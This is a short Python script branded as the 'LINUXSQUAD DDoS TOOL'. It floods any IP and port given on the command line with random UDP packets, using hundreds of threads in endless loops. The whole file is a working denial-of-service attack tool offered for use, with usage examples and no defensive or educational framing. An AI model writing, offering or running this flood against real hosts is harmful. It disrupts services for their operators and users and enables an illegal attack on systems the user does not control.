import sys
import socket
import threading
import random
import time

# Green Banner
print("\033[92m")
print(r"""
   \[ \ \] |                                                                            
 $$$$$$\   $$$$$$$\  \[ \ \]\ \[ \ \]\  $$$$$$$\  $$$$$$\  \[ \ \]\  $$$$$$\  
\[ __ \]\ \[ __ \]\ \[ | \] |\\[ \ \]  |\[ _____| \]  __\[ \ \] |  \[ | \____ \]\ 
\[ / \] |\[ | \] |\[ | \] | \$$$$  / \$$$$$$\  \[ / \] |\[ | \] | $$$$$$$ |
\[ | \] |\[ | \] |\[ | \] | \[  \]<   \____\[ \ \] |  \[ | \] |  \[ | \]  __\[ |
\$$$$$$  | \] |  \[ |\$$$$$$  | \]  /\\[ \ $$$$$$$  |\$$$$$$$ |\$$$$$$  |\$$$$$$$ |
 \______/ \__|  \__| \______/ \__/  \__|\_______/  \____ \] | \______/  \_______|
                                                      \[ | \] |                    
                                                      \__|                    
""")
print("               LINUXSQUAD DDoS TOOL - UDP FLOOD")
print("\033[0m")

print("\033[93m")
print("Usage   : python ddos.py <IP> <PORT> [THREADS]")
print("Example : python ddos.py 192.168.1.1 80 700")
print("\033[0m")

if len(sys.argv) < 3:
    print("\033[91m[!] Error: Not enough arguments!\033[0m")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600

print(f"\033[91m[+] Attack starting → {target}:{port} | Threads: {threads}\033[0m")
print("\033[92m[+] Flood is running... Press Ctrl + C to stop\033[0m\n")

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = random.randbytes(random.randint(512, 2048))
            sock.sendto(payload, (target, port))
        except:
            pass

for _ in range(threads):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

try:
    while True:
        time.sleep(5)
except KeyboardInterrupt:
    print("\n\033[91m[-] Attack stopped.\033[0m")
